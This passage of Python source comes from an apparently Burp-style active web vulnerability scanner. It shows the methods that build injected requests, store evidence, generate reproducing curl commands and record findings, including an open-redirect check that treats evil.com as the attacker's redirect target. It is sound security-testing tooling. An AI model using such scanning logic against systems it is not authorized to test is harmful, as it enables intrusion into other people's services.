        #    that regex DETECTORS patterns may miss (no vuln_type restriction).
        try:
            from .passive import ResponseKeywordsAnalyzer as _KWA
            _kw_matches = _KWA().analyze(
                resp_text,
                dict(resp.headers),
                injected_input=payload,
            )
            if _kw_matches:
                _best = _kw_matches[0]
                _kw_finding = (
                    f"Blind/error indicator via ResponseKeywordsAnalyzer — "
                    f"{_best.category}: {_best.keyword!r} in response "
                    f"[{surface.url} | param={surface.param} | payload={payload[:60]}]"
                )
                self._record_finding(
                    surface, vuln_type, payload, _kw_finding,
                    self.SEV_MAP.get(vuln_type, "medium"),
                    url, dict(resp.headers), str(headers), resp_text,
                    elapsed, resp.status_code,
                )
        except Exception:
            pass

    # ── Request builders ──────────────────────────────────────────────────────
    #
    # All injection logic is delegated to AuditInsertionPoint, which encodes
    # the full Burp Suite Montoya AuditInsertionPointType enum including the
    # two types that were previously missing: URL_PATH_FILENAME and
    # REQUEST_LINE.  Legacy string param_type values are coerced transparently.

    def _build_url(self, surface, payload: str) -> str:
        from .insertion_point import from_input_surface
        url, _, _ = from_input_surface(surface).build_http_request(payload)
        return url

    def _build_body(self, surface, payload: str) -> Optional[str]:
        from .insertion_point import from_input_surface
        _, _, body = from_input_surface(surface).build_http_request(payload)
        return body

    def _build_headers(self, surface, payload: str) -> dict:
        from .insertion_point import from_input_surface
        _, headers, _ = from_input_surface(surface).build_http_request(payload)
        return headers

    # ── Result recording ──────────────────────────────────────────────────────

    def _store_evidence(self, surface, vuln_type: str, payload: str, url: str,
                        req_headers: dict, req_body: str,
                        resp: requests.Response, elapsed: float) -> str:
        return self.ev_store.record(
            url=url,
            method=surface.method,
            req_headers=req_headers,
            req_body=req_body,
            status_code=resp.status_code,
            resp_headers=dict(resp.headers),
            resp_body=resp.text[:10000],
            resp_time_ms=elapsed,
            vuln_type=vuln_type,
            payload=payload,
            parameter=surface.param,
            source="active",
            scan_id=self.scan_id,
        )

    def _build_curl_cmd(self, surface, payload: str, resp=None) -> str:
        """Return a copy-pasteable curl command that reproduces the finding."""
        import shlex
        url     = self._build_url(surface, payload)
        body    = self._build_body(surface, payload)
        headers = self._build_headers(surface, payload)

        parts = ["curl", "-v", "-sk", "--max-redirs", "0"]
        parts += ["-X", surface.method]
        for k, v in (headers or {}).items():
            if k.lower() not in ("content-length",):
                parts += ["-H", f"{k}: {v}"]
        if body:
            parts += ["--data-raw", body]
        parts.append(url)
        return " ".join(shlex.quote(p) for p in parts)

    def _build_tp_reason(self, vuln_type: str, surface, payload: str, resp) -> str:
        """Return a human-readable explanation of why this is a confirmed true positive."""
        reasons = {
            "open_redirect": lambda: (
                f"✅ True Positive — {vuln_type.replace('_',' ').title()}\n"
                f"• Status: {resp.status_code} — server issued a real HTTP redirect\n"
                f"• Location header: {resp.headers.get('location','')}\n"
                f"• Payload '{payload}' was injected into param '{surface.param}' ({surface.param_type})\n"
                f"• Exact host match: evil.com is the redirect destination, not a substring\n"
                f"• Baseline probe (no evil.com payload) did NOT trigger this redirect — "
                f"confirms server is accepting attacker-controlled redirect targets\n"
                f"• Impact: victim visiting a crafted link is redirected to an attacker domain "
                f"(phishing, token theft, open redirect chain)"
            ),
        }
        builder = reasons.get(vuln_type)
        if builder:
            try:
                return builder()
            except Exception:
                pass
        return f"✅ Confirmed {vuln_type.replace('_',' ').title()} — payload '{payload[:80]}' produced a distinguishable response"

    def _record_finding(self, surface, vuln_type: str, payload: str,
                        finding_text: str, severity: str,
                        url: str, resp_headers: dict, req_headers: str,
                        resp_text: str, elapsed: float, status: int,
                        eid: Optional[str] = None,
                        proof: Optional[str] = None,
                        proof_data: Optional[str] = None,
                        confidence_level: Optional[AuditIssueConfidence] = None,
                        *,
                        baseline_time_ms: float = 0.0,
                        time_delta_ms: float = 0.0):
        # If proof was confirmed by ProofValidator, escalate to CERTAIN.
        # Otherwise auto-infer from vuln_type / finding text.
        if confidence_level is None:
            confidence_level = (
                AuditIssueConfidence.CERTAIN
                if proof
                else infer_confidence(vuln_type, finding_text, "")
            )
        log.warning("FINDING [%s] %s | url=%s | param=%s | payload=%s | status=%s | elapsed=%.0fms",
                    severity.upper(), vuln_type, surface.url, surface.param,
                    payload[:80], status, elapsed)
        if proof:
            log.info("  proof: %s", (proof or "")[:120])
        result = FuzzResult(
            url=surface.url, method=surface.method,
            param=surface.param, param_type=surface.param_type,
            payload=payload, vuln_type=vuln_type,
            finding=finding_text, severity=severity,
            evidence_id=eid, resp_time_ms=elapsed, status_code=status,
            baseline_time_ms=baseline_time_ms, time_delta_ms=time_delta_ms,
            proof=proof, proof_data=proof_data,
            confidence_level=confidence_level,
        )
        with self._lock:
            self.results.append(result)
        if self.on_finding:
            self.on_finding(result)
